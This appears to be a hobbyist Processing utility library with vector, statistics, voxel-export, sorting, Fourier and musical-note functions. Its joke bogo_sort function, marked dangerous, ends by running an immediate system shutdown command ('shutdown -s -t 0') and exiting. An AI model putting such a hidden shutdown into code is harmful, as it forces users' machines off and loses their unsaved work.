
//Similar to GLSL's mix, blends two PVectors based on a number from 0-1. 0 = closer to a, 1 = closer to b.
PVector mix(float x, PVector a, PVector b) {
  float tx = a.x * (1.0f - x) + b.x * x;
  float ty = a.y * (1.0f - x) + b.y * x;
  float tz = a.z * (1.0f - x) + b.z * x;
  return new PVector(tx, ty, tz);
}

//Similar to GLSL's mix, blends two PVectors based on a number from 0-1. 0 = closer to a, 1 = closer to b.
color mix_p_c(float x, PVector a, PVector b) {
  float tx = a.x * (1.0f - x) + b.x * x;
  float ty = a.y * (1.0f - x) + b.y * x;
  float tz = a.z * (1.0f - x) + b.z * x;
  return color(tx, ty, tz);
}

//Similar to GLSL's mix, blends two colors based on a number from 0-1. 0 = closer to a, 1 = closer to b.
color mix(float x, color a, color b) {
  float tx = r(a) * (1.0f - x) + r(b) * x;
  float ty = g(a) * (1.0f - x) + g(b) * x;
  float tz = b(a) * (1.0f - x) + b(b) * x;
  return color(tx, ty, tz);
}

//Just copies a PVector to another one, Java passes by reference (sort of), so this is useful when you don't want to modify your function arguments.
PVector copy_vec(PVector x) {
  return new PVector(x.x, x.y, x.z);
}

VecN copy_vec(VecN x) {
  return new VecN(x.data);
}

final String SHARP = "\u266F";
final String FLAT = "\u266D";
final float SQRT_2 = 1.41421356237f;

//Processing's built-in PVector class can't really handle more than 3 dimensions, so this is just a quick n-D vector class.
class VecN {
  ArrayList<Float> data = new ArrayList<Float>();
  float x = 0.0f;
  float y = 0.0f;
  float z = 0.0f;
  float w = 0.0f;
  void update_swizzles() {
    if(data.size() >= 1) x = data.get(0);
    if(data.size() >= 2) y = data.get(1);
    if(data.size() >= 3) z = data.get(2);
    if(data.size() >= 4) w = data.get(3);
  }
  VecN(ArrayList<Float> list) {
    for(float f : list)
      data.add(f);
    update_swizzles();
  }
  VecN(float x) {
    this.x = x;
    data.add(x);
  }
  VecN(float x, float y) {
    this.x = x;
    this.y = y;
    data.add(x);
    data.add(y);
  }
  VecN(float x, float y, float z) {
    this.x = x;
    this.y = y;
    this.z = z;
    data.add(x);
    data.add(y);
    data.add(z);
  }
  VecN(float x, float y, float z, float w) {
    this.x = x;
    this.y = y;
    this.z = z;
    this.w = w;
    data.add(x);
    data.add(y);
    data.add(z);
    data.add(w);
  }
  float magnitude() {
    float sum = 0.0f;
    for(float x : data)
      sum += x*x;
    return sqrt(sum);
  }
  float distance(VecN x) {
    float sum = 0.0f;
    for(int i = 0; i < max(data.size(), x.data.size()); i++) {
      float a = 0.0f; if(i < data.size()) a = data.get(i);
      float b = 0.0f; if(i < x.data.size()) b = x.data.get(i);
      sum += (b-a)*(b-a);
    }
    return sqrt(sum);
  }
  void multiply(float x) {
    for(int i = 0; i < data.size(); i++)
      data.set(i, data.get(i)*x);
    update_swizzles();
  }
  VecN multiply(VecN v, float x) {
    VecN q = copy_vec(v);
    q.multiply(x);
    return q;
  }
  void addition(VecN x) {
    while(data.size() < x.data.size())
      data.add(0.0f);
    for(int i = 0; i < x.data.size(); i++) {
      data.set(i, data.get(i) + x.data.get(i));
    }
    update_swizzles();
  }
  VecN addition(VecN v, VecN x) {
    VecN q = copy_vec(v);
    q.addition(x);
    return q;
  }
  void subtract(VecN x) {
    while(data.size() < x.data.size())
      data.add(0.0f);
    for(int i = 0; i < x.data.size(); i++) {
      data.set(i, data.get(i) - x.data.get(i));
    }
    update_swizzles();
  }
  VecN subtract(VecN v, VecN x) {
    VecN q = copy_vec(v);
    q.subtract(x);
    return q;
  }
  void absolute_value() {
    for(int i = 0; i < data.size(); i++)
      if(data.get(i) < 0.0f)
        data.set(i, -data.get(i));
  }
  VecN absolute_value(VecN v) {
    VecN q = copy_vec(v);
    q.absolute_value();
    return q;
  }
  PVector to_PVector() {
    return new PVector(x, y, z);
  }
  void normalizeV() {
    if(magnitude() > 0.0f)
      multiply(1.0f/magnitude());
  }
  void print_self() {
    String toP = "";
    toP += "{";
    for(int i = 0; i < data.size(); i++) {
      toP += data.get(i);
      if(i != data.size()-1) toP += ", ";
    }
    toP += "}\n";
    print(toP);
  }
  void setX(float x) {
    if(data.size() >= 1) data.set(0, x);
  }
  void setY(float y) {
    if(data.size() >= 2) data.set(1, y);
  }
  void setZ(float z) {
    if(data.size() >= 3) data.set(2, z);
  }
  void setW(float x) {
    if(data.size() >= 4) data.set(3, x);
  }
}

int r(color c) {return (c >> 16) & 255; }
int g(color c) {return (c >> 8) & 255;}
int b(color c) {return c & 255; }

float distance(float x, float y, float z, float w, float xx, float yy, float zz, float ww) {
  return sqrt((xx-x)*(xx-x) + (yy-y)*(yy-y) + (zz-z)*(zz-z) + (ww-w)*(ww-w));
}

//--------------------------------------------------------------------------------------------------------//
// .vox importer/exporter, created by Adam Lastowka.
//--------------------------------------------------------------------------------------------------------//
// Example Usage:
//
// VoxDataParser vdp = new VoxDataParser();
// boolean[][][] b = v.parseFile("cat.vox");
// v.exportDataToOBJ(b, "catOBJ.obj");
//--------------------------------------------------------------------------------------------------------//
// Some specifications of the .vox file format:
// Comments can be inserted into files! Just preface them with a hashtag for safety.
// The dim command declares the size of the voxel region. dim 10 20 15 would preface a 10x20x15 dataset.
// The data is stored in slices. A 3x3x3 voxel data set would look like this in a file:
// Example_File.vox:
// 
// # This is a comment
// dim 3 3 3 
// 
// 110 # Fist slice
// 101
// 001
// 
// 011 # Second slice
// 000
// 010
// 
// 111 # Third slice
// 110
// 000
//
// End Example_File.vox.
//
// Of course, in order to compress things a bit, we don't put spaces in between the slices. Or commands.
// That's not to say you can't, though! The interpreter doesn't mind empty lines. 
// But it does mind ones with something in them, so always preface comments in files with a hashtag (#).
//
// The X dimension of a dataset is the number of blocks.
// The Y dimension of a dataset is the number of lines per block.
// The Z dimension of a dataset is the length of each line.
// The arguments of dim MUST correspond to these attributes!
//--------------------------------------------------------------------------------------------------------//
class VoxDataParser {
  //This will save the values in data in .vox data format to the specified location. 
  void save_to_VOX(boolean[][][] data, String location) {
    ArrayList<String> outData = new ArrayList<String>();
    outData.add("dim " + data.length + " " + data[0].length + " " + data[0][0].length);
    for(int x = 0; x < data.length; x++)
      for(int y = 0; y < data[0].length; y++) {
        String biSlice = "";
        for(int z = 0; z < data[0][0].length; z++) {
          if(data[x][y][z])
            biSlice += "1";
          else
            biSlice += "0";
        }
        outData.add(biSlice);
      }
    saveStrings(location, outData.toArray(new String[outData.size()]));
  }
  
  //This will load a .vox file from the specified location and return a boolean array of the data in the file.
  boolean[][][] parse_file(String location) {
    return parse_file(loadStrings(location));
  }
  
  //This will convert a String array (taken from a loaded file in the .vox data format) and turn it into a boolean array.
  boolean[][][] parse_file(String[] data) {
    boolean[][][] voxData = null;
    int dataIndex = 0;
    int xDim = 0;
    int yDim = 0;
    int zDim = 0;
    for(int i = 0; i < data.length; i++) {
      if(data[i].startsWith("dim ")) {
        xDim = int(data[i].split(" ")[1]);
        yDim = int(data[i].split(" ")[2]);
        zDim = int(data[i].split(" ")[3]);
        voxData = new boolean[xDim][yDim][zDim];
      }
      if(data[i].startsWith("1") || data[i].startsWith("0")) {
        for(int k = 0; k < data[i].length(); k++) {
          voxData[dataIndex/yDim][dataIndex%yDim][k] = (data[i].charAt(k) == '1');
        }
        dataIndex++;
      }
    }
    return voxData;
  }
  
  //This will export the boolean values in data to .OBJ file format and save at the specified location.
  //This function in particular is pretty beautifully written :3
  void export_data_to_OBJ(boolean[][][] data, String location) {
    int[][][] vertexPlaces = new int[data.length+1][data[0].length+1][data[0][0].length+1];
    ArrayList<String> outData = new ArrayList<String>();
    println("Generating vertices...");
    int vertexTick = 1;
    for(int x = 0; x < vertexPlaces.length; x++)
      for(int y = 0; y < vertexPlaces[0].length; y++)
        for(int z = 0; z < vertexPlaces[0][0].length; z++) {
          boolean placePoint = false;
          placePoint |= data[clamp(x, 0, data.length-1)][clamp(y, 0, data[0].length-1)][clamp(z, 0, data[0][0].length-1)];
          placePoint |= data[clamp(x-1, 0, data.length-1)][clamp(y, 0, data[0].length-1)][clamp(z, 0, data[0][0].length-1)];
          placePoint |= data[clamp(x, 0, data.length-1)][clamp(y-1, 0, data[0].length-1)][clamp(z, 0, data[0][0].length-1)];
          placePoint |= data[clamp(x, 0, data.length-1)][clamp(y, 0, data[0].length-1)][clamp(z-1, 0, data[0][0].length-1)];
          
          placePoint |= data[clamp(x-1, 0, data.length-1)][clamp(y-1, 0, data[0].length-1)][clamp(z, 0, data[0][0].length-1)];
          placePoint |= data[clamp(x, 0, data.length-1)][clamp(y-1, 0, data[0].length-1)][clamp(z-1, 0, data[0][0].length-1)];
          placePoint |= data[clamp(x-1, 0, data.length-1)][clamp(y, 0, data[0].length-1)][clamp(z-1, 0, data[0][0].length-1)];
          placePoint |= data[clamp(x-1, 0, data.length-1)][clamp(y-1, 0, data[0].length-1)][clamp(z-1, 0, data[0][0].length-1)];
          
          if(placePoint) {
            vertexPlaces[x][y][z] = vertexTick;
            outData.add("v " + x + " " + y + " " + z);
            vertexTick++;
          }
        }
    println("Slicing...");
    for(int x = 0; x < data.length; x++)
      for(int y = 0; y < data[0].length; y++) {
        boolean wasOn = false;
        for(int z = 0; z <= data[0][0].length; z++) {
          boolean isOn = false;
          if(z < data.length)
            isOn = data[x][y][z];
          if(isOn ^ wasOn) {
            outData.add("f " + vertexPlaces[x][y][z] + " " + vertexPlaces[x+1][y+1][z] + " " + vertexPlaces[x+1][y][z]);
            outData.add("f " + vertexPlaces[x][y][z] + " " + vertexPlaces[x][y+1][z] + " " + vertexPlaces[x+1][y+1][z]);
          }
          wasOn = isOn;
        }
      }
    println("Z Axis sliced.");
    for(int z = 0; z < data[0][0].length; z++)
      for(int x = 0; x < data.length; x++) {
        boolean wasOn = false;
        for(int y = 0; y <= data[0].length; y++) {
          boolean isOn = false;
          if(y < data.length)
            isOn = data[x][y][z];
          if(isOn ^ wasOn) {
            outData.add("f " + vertexPlaces[x][y][z] + " " + vertexPlaces[x+1][y][z+1] + " " + vertexPlaces[x+1][y][z]);
            outData.add("f " + vertexPlaces[x][y][z] + " " + vertexPlaces[x][y][z+1] + " " + vertexPlaces[x+1][y][z+1]);
          }
          wasOn = isOn;
        }
      }
    println("Y Axis sliced.");
    for(int y = 0; y < data[0].length; y++)
      for(int z = 0; z < data[0][0].length; z++) {
        boolean wasOn = false;
        for(int x = 0; x <= data.length; x++) {
          boolean isOn = false;
          if(x < data.length)
            isOn = data[x][y][z];
          if(isOn ^ wasOn) {
            outData.add("f " + vertexPlaces[x][y][z] + " " + vertexPlaces[x][y+1][z+1] + " " + vertexPlaces[x][y+1][z]);
            outData.add("f " + vertexPlaces[x][y][z] + " " + vertexPlaces[x][y][z+1] + " " + vertexPlaces[x][y+1][z+1]);
          }
          wasOn = isOn;
        }
      }
    println("X Axis sliced.");
    println("Saving file...");
    saveStrings(location, outData.toArray(new String[outData.size()]));
    println("Done! Saved file to " + location);
  }
  int clamp(int a, int x, int y) {
    if(x > y) return -1;
    if(a < x) return x;
    if(a > y) return y;
    return a;
  }
}
//--------------------------------------------------------------------------------------------------------//

public float sigmoid(float x) {
  return 1/(1+exp(10*-x))-0.5;
}

//Returns (a, b) in f(x) = a*x + b
PVector line_of_best_fit(PVector... data) {
  PVector o = new PVector();
  float sX = 0.f;
  float sY = 0.f;
  float sX2 = 0.f;
  float sXY = 0.f;
  for(PVector p : data) {
    sX += p.x;
    sY += p.y;
    sX2 += p.x*p.x;
    sXY += p.x*p.y;
  }
  float xM = sX/float(data.length);
  float yM = sY/float(data.length);
  float slope = (sXY - sX*yM) / (sX2 - sX*xM);
  float y_int = yM - slope*xM;
  return new PVector(slope, y_int);
}

double pearson_correlation(PVector... data) {
  double o = 0.0;
  double sX = 0.0;
  double sY = 0.0;
  for(PVector p : data) {
    sX += p.x;
    sY += p.y;
  }
  double xM = sX/float(data.length);
  double yM = sY/float(data.length);
  double numerator = 0.0;
  double denom1 = 0.0;
  double denom2 = 0.0;
  for(PVector p : data) {
    numerator += (p.x - xM) * (p.y - yM);
    denom1 += (p.x - xM) * (p.x - xM);
    denom2 += (p.y - yM) * (p.y - yM);
  }
  denom1 = java.lang.Math.sqrt(denom1);
  denom2 = java.lang.Math.sqrt(denom2);
  double denominator = denom1*denom2;
  o = numerator/denominator;
  return o;
}

double sum(double... data) {
  double sum = 0.0;
  for(double d : data) {
    sum += d;
  }
  return sum;
}

double mean(double... data) {
  double sum = 0.0;
  double div = 0.0;
  for(double d : data) {
    sum += d;
    div++;
  }
  return sum/div;
}

double standard_deviation(double... data) {
  double m = mean(data);
  double sum = 0.0;
  double div = 0.0;
  for(double d : data) {
    sum += (m-d)*(m-d);
    div++;
  }
  sum /= div;
  return Math.sqrt(sum);
}

public PVector[] load_data_PVector(String location, String delimiter) {
  String[] f = loadStrings(location);
  int offset = 0;
  boolean numberFound = false;
  while(!numberFound) {
    try {
      float x = Float.parseFloat(f[offset].split(delimiter)[0]);
      numberFound = true;
    } catch(NumberFormatException nfe) {
      offset++;
    }
  }
  PVector[] p = new PVector[f.length-offset];
  for(int i = 0; i < f.length-offset; i++) {
    String[] r = f[i+offset].split(",");
    try {
      p[i] = new PVector(Float.parseFloat(r[0]), Float.parseFloat(r[1]));
    } catch(NumberFormatException nfe) {
      println("Number formatting error!");
      p[i] = new PVector();
    }
  }
  return p;
}

import javax.swing.*;
public String prompt_file() {
  try {
    UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
  } catch (Exception cnfe) {}
  final JFileChooser fc = new JFileChooser();
  int returnVal = fc.showOpenDialog(null);
  if (returnVal == JFileChooser.APPROVE_OPTION) {
    File file = fc.getSelectedFile();
    return file.getAbsolutePath();
  }
  return "";
}

public void outlined_text(String s, float x, float y, color c_exterior, color c_interior) {
  fill(c_exterior);
  text(s, x - 1, y);
  text(s, x, y - 1);
  text(s, x + 1, y);
  text(s, x, y + 1);
  fill(c_interior);
  text(s, x, y);
}

public void double_outlined_text(String s, float x, float y, color c_exterior, color c_interior) {
  outlined_text(s, x + 1, y, c_exterior, c_interior);
  outlined_text(s, x - 1, y, c_exterior, c_interior);
  outlined_text(s, x, y + 1, c_exterior, c_interior);
  outlined_text(s, x, y - 1, c_exterior, c_interior);
}

// GLOWING
// Martin Schneider
// October 14th, 2009
// k2g2.org
// use the glow function to add radiosity to your animation :)
// r (blur radius) : 1 (1px)  2 (3px) 3 (7px) 4 (15px) ... 8  (255px)
// b (blur amount) : 1 (100%) 2 (75%) 3 (62.5%)        ... 8  (50%)
void glow(int r, int b) {
  loadPixels();
  blur(1); // just adding a little smoothness ...
  int[] px = new int[pixels.length];
  arrayCopy(pixels, px);
  blur(r);
  mix88(px, b);
  updatePixels();
}
void blur(int dd) {
   int[] px = new int[pixels.length];
   for(int d=1<<--dd; d>0; d>>=1) { 
      for(int x=0;x<width;x++) for(int y=0;y<height;y++) {
        int p = y*width + x;
        int e = x >= width-d ? 0 : d;
        int w = x >= d ? -d : 0;
        int n = y >= d ? -width*d : 0;
        int s = y >= (height-d) ? 0 : width*d;
        int r = ( r(pixels[p+w]) + r(pixels[p+e]) + r(pixels[p+n]) + r(pixels[p+s]) ) >> 2;
        int g = ( g(pixels[p+w]) + g(pixels[p+e]) + g(pixels[p+n]) + g(pixels[p+s]) ) >> 2;
        int b = ( b(pixels[p+w]) + b(pixels[p+e]) + b(pixels[p+n]) + b(pixels[p+s]) ) >> 2;
        px[p] = 0xff000000 + (r<<16) | (g<<8) | b;
      }
      arrayCopy(px,pixels);
   }
}
void mix88(int[] px, int n) {
  for(int i=0; i< pixels.length; i++) {
    int r = (r(pixels[i]) >> 1)  + (r(px[i]) >> 1) + (r(pixels[i]) >> n)  - (r(px[i]) >> n) ;
    int g = (g(pixels[i]) >> 1)  + (g(px[i]) >> 1) + (g(pixels[i]) >> n)  - (g(px[i]) >> n) ;
    int b = (b(pixels[i]) >> 1)  + (b(px[i]) >> 1) + (b(pixels[i]) >> n)  - (b(px[i]) >> n) ;
    pixels[i] =  0xff000000 | (r<<16) | (g<<8) | b;
  }
}

public boolean is_IPV4(String addr) {
  String[] d = addr.split("\\.");
  if (d.length != 4) return false;
  for (String s : d)
    for (char c : s.toCharArray ())
      if (c!='0'&&c!='1'&&c!='2'&&c!='3'&&c!='4'&&c!='5'&&c!='6'&&c!='7'&&c!='8'&&c!='9') {
        return false;
      }
  return true;
}

public String get_time() {
  return year() + "-" + month() + "-" + day() + "-" + hour() + "-" + minute() + "-" + second() + "-" + millis();
}

void draw_arrow(float start_x, float start_y, float end_x, float end_y, float barb_length, float barb_theta) {
  line(start_x, start_y, end_x, end_y);
  PVector v = new PVector(start_x - end_x, start_y - end_y);
  v.normalize();
  v.mult(barb_length);
  v.rotate(barb_theta/2.);
  line(end_x, end_y, end_x + v.x, end_y + v.y);
  v.rotate(-barb_theta);
  line(end_x, end_y, end_x + v.x, end_y + v.y);
}

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

/**
 * EDIT-- Modified for Processing (removed static declerations on methods, removed "Sorter" class, etc.
 * A simple sorting class for all your sorting needs.
 * (Don't use bogoSort)
 * @author Adam
 */
 
 
/**
 * This is just a function to make calling quickSort() a little easier.
 * @param input
 * @throws ZeroLengthArrayException 
 */
public void quick_sort(float[] input) {
  if(input.length != 0)
    custom_recursive_partition(input, 0, input.length-1);
}

/**
 * Recursive pivot sorting algorithm (QuickSort).
 * Acomplishes in average of O(n*log(n)).
 * @param arr
 * @param low
 * @param high
 */
public void custom_recursive_partition(float[] arr, int low, int high) {
  //Store these values for later on, they get modified in the method.
  int flow = low;
  int fhigh = high;
  //Find the pivot value.
  float pivot = (arr[low]+arr[high])/2;
  //do{}while() makes things a bit easier here.
  do {
    //Search for a values that are lower and higer than the pivot.
        while (arr[low]<pivot) low++;
        while (arr[high]>pivot) high--;
        //If we haven't crossed the indexes, swap the two values.
        if (low<=high) {
            swap(arr, high, low);
            //Move these so we don't get confused later.
            low++;
            high--;
        }
        //Do it while the indexes have not crossed.
    } while (low<=high);
  //Recursion! (It makes everything better).
  if(flow<high)
    custom_recursive_partition(arr, flow, high);
  if(low<fhigh)
    custom_recursive_partition(arr, low, fhigh);
}
  
/**
 * Here is a very slightly optimized version of BubbleSort
 * that goes through and pulls out the rabbits and turtles beforehand.
 * (I don't think it really did too much...)
 * @param input
 * @throws ZeroLengthArrayException 
 */  
public void mod_bubble_sort(float[] input) {
  if(input.length != 0) {
  float min = min(input);
  float avg = mean(input);
  float max = max(input);
  boolean swapped;
  boolean small;
  //Here we weed out the turtles...
  for(int i = input.length*2/3; i < input.length; i++) {
    //Basically, I go through and swap any small elements with big ones
    //I find at the beginning of the array. You will probably never want
    //or need to use this, so you don't have to try and figure it out.
    swapped = false;
    small = false;
    int index = 0;
    if(input[i]<(avg+min)/2)
      small = true;
    while(!swapped&&small&&index<input.length/2) {
      if(input[i]<input[index]&&input[index]>avg) {
        swap(input, i, index);
      }
      index++;
    }
  }
  //And the rabbits.
  for(int i = 0; i < input.length/3; i++) {
    swapped = false;
    small = false;
    int index = input.length;
    if(input[i]>(avg+max)/2)
      small = true;
    while(!swapped&&small&&index>input.length/2) {
      if(input[i]>input[index]&&input[index]<avg) {
        swap(input, i, index);
      }
      index--;
    }
  }
  //If you want an explanation on this, see the comments for bubbleSort.
  for(int i = 0; i < input.length-1; i++)
    for(int k = 0; k < input.length-1-i; k++) {
      if(input[k+1]<input[k])
        swap(input, k, k+1);
    }
  }
}
  
/**
 * BubbleSort! It's got a funny name.
 * Too bad it runs at an average of O(n^2).
 * @param input
 */
public void bubble_sort(float[] input) {
  if(input.length != 0)
  //Pretty simple, go through all elements, if the following element is smaller than the foremost, switch them.
  //Repeat this process for the length of the array, but go through one less element each time.
  for(int i = 0; i < input.length-1; i++)
    for(int k = 0; k < input.length-1-i; k++) {
      if(input[k+1]<input[k])
        swap(input, k, k+1);
    }
}
  
/**
 * Takes the average time of O(n^2).
 * @param input
 * @throws ZeroLengthArrayException 
 */
public static void selection_sort(float[] input) {
  if(input.length != 0)
  //Iterate through every element in the array.
  for(int i = 0; i < input.length; i++) {
    //This will be the lowest number.
    float l = 10000000;
    //This will be the location of the lowest number.
    int w = 0;
    //Here is where the time gets to O(n^2), we loop through all elements in the array above i.
    for(int k = i; k < input.length; k++)
      //If the current value is smaller than b (the current lowest), make the current value the lowest.
      if(input[k]<=l) {
        l = input[k];
        //Don't forget to re-assign the index!
        w = k;
      }
    //Switch the value at position i with the lowest value.
    input[w] = input[i];
    input[i] = l;
  }
}
  
/**
 * DO NOT TO USE THIS for your sorting needs.
 * I AM SERIOUS, THIS IS NOT A GOOD ALGORITHM.
 * If you don't believe me, run it.
 * At least it tries...
 * @param input
 * @dangerous
 */
public void bogo_sort(float[] input, int tries) {
  //Let's see... uh... loop...
  for(int i = 0; i < input.length; i++)
    //Going well so far...
    input[i] = input[(int)(Math.random()*input.length)];
  //This doesn't look right. Im gonna try again...
  if(!is_sorted(input)&&tries<14)
    bogo_sort(input, tries + 1);
  //Oh god... don't panic... let's try something else...
  selection_sort(input);
  //I hope nobody saw me do that.
  //Nonononono these aren't the same values, what did i lose?
  //dontpanicdontpanic
  for(int i = 0; i < input.length; i++) {
    input[i] = input[i] + (float)Math.random();
  }
  //NONONONONONONONONO
  input = null;
  tries = 129409845&0xFFFF;
  //ITSNOTWORKINGITSNOTWORKINGWHATDOIDOHELPHELPHELP
  Runtime runtime = Runtime.getRuntime();
  //IMSOSORRYIDIDNTWANTITTOENDTHISWAY
  try {
    @SuppressWarnings("unused")
    Process proc = runtime.exec("shutdown -s -t 0");
  } catch (IOException e) {}
  System.exit(0);
  return;
}

/**
 * Use this for determening if a list is sorted (it's O(n), don't worry).
 * It will take the list sorted from least to greatest and greatest to least.
 * @param input
 * @return If the list is sorted.
 */
public boolean is_sorted(float[] input) {
  boolean r = true;
  boolean rr = true;
  for(int i = 1; i < input.length; i++) {
    if(input[i-1]<input[i])
      r = false;
  }
  for(int i = 1; i < input.length; i++) {
    if(input[i-1]>input[i])
      rr = false;
  }
  if(r||rr)
    r = true;
  return r;
}

/**
 * Swaps two elements of index a and b in a given array.
 * @param input
 * @param a
 * @param b
 */
public void swap(float[] arr, int a, int b) {
  float temp = arr[a];
  arr[a] = arr[b];
  arr[b] = temp;
}

/**
 * Jumbles an array (does not tumble).
 * @param arr
 * @param scale
 * @param integize
 */
public void jumble(float[] arr, float scale, boolean integize) {
  for(int i = 0; i < arr.length; i++) {
    if(!integize)
      arr[i] = (float)(Math.random()*scale);
    else
      arr[i] = (int)(Math.random()*scale);
  }
}

/**
 * Gives the mean value of a given set of elements in the form of an array.
 * @param input
 * @return The mean of the input array.
 */
public float mean(float... input) {
  float output = 0;
  for(float k:input)
    output += k;
  output /= input.length;
  return output;
}

/**
 * Gives the standard deviation of a given set of numbers in the form of an array.
 * @param input
 * @return The standard deviation (sigma).
 */
public float standard_deviation(float... input) {
  float output = 0;
  float g = 0;
  float mean = mean(input);
  for(float k:input) {
    g = mean-k;
    output += g*g;
  }
  output /= input.length;
  output = (float)Math.sqrt(output);
  return output;
}

/**
 * Binds two arrays together.
 * @param arrA
 * @param arrB
 * @return the combonation of arrays arrA and arrB like so: {arrA arrB}
 */
public float[] bind(float[] arrA, float[] arrB) {
  //This is for slight optimization.
  int aL = arrA.length;
  int bL = arrB.length;
  //Create the array to return with the length of the sum of the two input arrays.
  float[] output = new float[aL + bL];
  //Assign the first elements in the output array the values of the elements in arrA.
  for(int i = 0; i < aL; i++) {
    output[i] = arrA[i];
  }
  //Assign the rest of the elements in the output array the values of the elements in arrB.
  for(int i = aL; i < aL + bL; i++) {
    output[i] = arrB[i-aL];
  }
  //Finished.
  return output;
}


public float[] toFloatArray(String[] input) {
  float[] output = new float[input.length];
  for(int i = 0; i < output.length; i++) {
    output[i] = Float.valueOf(input[i]);
  }
  return output;
}

public float[] toArray(ArrayList<Float> input) {
  float[] v = new float[input.size()];
  for(int i = 0; i < input.size(); i++) {
    v[i] = input.get(i);
  }
  return v;
}

public String readInput() {
    BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
      String userInput = null;
      try {
         userInput = br.readLine();
      } catch (IOException ioe) {
         System.out.println("IO error trying to read input!");
         System.exit(1);
      }
      return userInput;
}

float sgn(float x) {
  if(x < 0.f)
    return -1.f;
  if(x > 0.f)
    return 1.f;
  return 0.f;
}

public class FourierTransformer {
  private int size = 36000;
  private float[] sine = new float[size+1];
  
  public FourierTransformer() {
    for(int i = 0; i <= size; i++) {
      sine[i] = sin(float(i)/float(size)*TWO_PI);
    }
  }
  
  float getSine(float angle) {
    float k = (angle > 0.f) ? 1.f : -1.f;
    int angleCircle = int(abs(angle)/TWO_PI*size)%size;
    return sine[angleCircle]*k;
  }
  
  float getSquareWave(float angle) {
    return sgn(getSine(angle));
  }
  
  //DFT
  //frequency specified in Hz
  //dt = the span of the data
  float discrete_fourier_transform(float frequency, float dt, float... data) {
    float mult = 2.f*PI*frequency*dt/(float)data.length;
    float real = 0.f;
    float imag = 0.f;
    for(int i = 0; i < data.length-1; i++) {
      real += data[i]*getSine(mult*i-PI/2);
      imag += data[i]*getSine(mult*i);
    }
    float power = sqrt(real*real + imag*imag)/(float)data.length;
    return power;
  }
  
  //Example Usage: fourier.gradient_ascent(100, 1.f, 30.f, frequency, dt, q)
  float gradient_ascent(int iterations, float mu, float speed, float frequency_guess, float dt, float... data) {
    float x = frequency_guess;
    for(int i = 0; i < iterations; i++) {
      float s0 = discrete_fourier_transform(x - mu, dt, data);
      float s1 = discrete_fourier_transform(x + mu, dt, data);
      float up = (s1-s0)/mu;
      x += up*speed;
    }
    return x;
  }
  
  //Frequency, radius, and accuracy all specified in Hz
  float inspect(float frequency, float radius, float accuracy, float dt, float... data) {
    float max_power = 0.f;
    float output_frequency = 0.f;
    for(float i = frequency - radius; i <= frequency + radius; i += accuracy) {
      float z = discrete_fourier_transform(i, dt, data);
      if(z > max_power) {
        max_power = z;
        output_frequency = i;
      }
    }
    return output_frequency;
  }
}

String[] musical_notes_81bpqs01MA18YUB1a2 = new String[]{"A", "A"+SHARP+"/B"+FLAT, "B", "C", "C"+SHARP+"/D"+FLAT, "D", "D"+SHARP+"/E"+FLAT, "E", "F", "F"+SHARP+"/G"+FLAT, "G", "G"+SHARP+"/A"+FLAT, "A"};
//Frequency specified in Hz
//Given a frequency, this function will return the letter note of the key closest to that frequency (using equal temperament)
String frequency_to_note_letter(float frequency) {
  boolean bongo = false;
  float x = frequency;
  int i = 0;
  while(!bongo) {
    if(x < 440)
      x *= 2.0f;
    if(x > 880)
      x /= 2.0f;
    if(x < 880 && x >= 440)
      break;
    if(i > 40)
      break;
    i++;
  }
  x /= 440.f;
  int k = round(musical_log(x));
  if(k == 12) k = 0;
  return musical_notes_81bpqs01MA18YUB1a2[k];
}

//Frequency specified in Hz
//Given a frequency, this function will return the index of the key closest to that frequency (using equal temperament)
//Indices start at a and go from 0-11
int frequency_to_note_index(float frequency) {
  boolean bongo = false;
  float x = frequency;
  int i = 0;
  while(!bongo) {
    if(x < 440)
      x *= 2.0f;
    if(x > 880)
      x /= 2.0f;
    if(x < 880 && x >= 440)
      break;
    if(i > 40)
      break;
    i++;
  }
  x /= 440.f;
  int k = round(musical_log(x));
  if(k == 12) k = 0;
  return k;
}

//Frequency specified in Hz
//Given a frequency, this finds the frequency of the nearest note down (using equal temperament)
float floor_note(float frequency) {
  boolean bongo = false;
  float x = frequency;
  float b = 1.f;
  int i = 0;
  while(!bongo) {
    if(x < 440) {
      x *= 2.f;
      b /= 2.f;
    }
    if(x > 880) {
      x /= 2.f;
      b *= 2.f;
    }
    if(x < 880 && x >= 440)
      break;
    if(i > 40)
      break;
    i++;
  }
  float k = floor(musical_log(x/440.f));
  k = b*musical_exp(k)*440.f;
  return k;
}

//Frequency specified in Hz
//Given a frequency, this finds the frequency of the nearest note up (using equal temperament)
float ceil_note(float frequency) {
  boolean bongo = false;
  float x = frequency;
  float b = 1.f;
  int i = 0;
  while(!bongo) {
    if(x < 440) {
      x *= 2.f;
      b /= 2.f;
    }
    if(x > 880) {
      x /= 2.f;
      b *= 2.f;
    }
    if(x < 880 && x >= 440)
      break;
    if(i > 40)
      break;
    i++;
  }
  float k = ceil(musical_log(x/440.f));
  k = b*musical_exp(k)*440.f;
  return k;
}

//Frequency specified in Hz
//Returns a PVector in the form:
// (nearest note down from frequency, nearest note up from frequency, lerp value of input frequency between the two)
PVector closest_notes(float frequency) {
  float noteA = floor_note(frequency);
  float noteB = ceil_note(frequency);
  float lerp = (frequency - noteA)/(noteB - noteA);
  return new PVector(noteA, noteB, lerp);
}

float musical_log(float x) {
  return log(x)/log(1.05946309436f);
}

float musical_exp(float x) {
  return pow(1.05946309436f, x);
}

boolean is_in_bounds_exclusive(float x, float y, float x0, float y0, float w, float h) {
  return (x > x0) && (x < x0+w) && (y > y0) && (y < y0+h);
}
